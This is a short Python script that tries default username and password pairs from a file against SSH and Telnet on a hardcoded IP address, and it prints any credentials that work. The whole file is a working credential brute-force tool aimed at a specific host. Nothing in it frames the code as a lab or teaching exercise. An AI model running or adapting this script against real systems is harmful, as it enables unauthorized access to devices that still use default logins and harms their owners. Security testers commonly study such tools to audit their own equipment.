import paramiko
import telnetlib
    
def SSHLogin(host,port,username,password):
    try: 
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host,port=port,username=username,password=password);
        ssh_session = ssh.get_transport().open_session()
        if ssh_session.active:
            print("SSH login successful on %s:%s with username %s and password %s" % (host,port,username,password))
        ssh.close()
    except:
            print("SSH login failed %s %s" % (username,password))
    
def TelnetLogin(host,port,username,password):
    try: 
        tn = telnetlib.Telnet(host,port)
        tn.read_until(b"login: ")
        tn.write((username + "\n").encode("utf-8"))
        tn.read_until(b"Password: ")
        tn.write((password + "\n").encode("utf-8"))
        result = tn.expect([b"Last login"],timeout=2)
        if (result[0] >= 0):
            print("Telnet login successful on %s:%s with username %s and password %s" % (host,port,username,password))
        tn.close()
    except Exception as e:
        print("Telnet login failed %s %s" % (username,password))

host = "3.20.135.129"
with open("defaults.txt","r") as f:
    for line in f:
        vals = line.split()
        username = vals[0].strip()
        password = vals[1].strip()
        SSHLogin(host,"22",username,password)
        TelnetLogin(host,23,username,password)
        
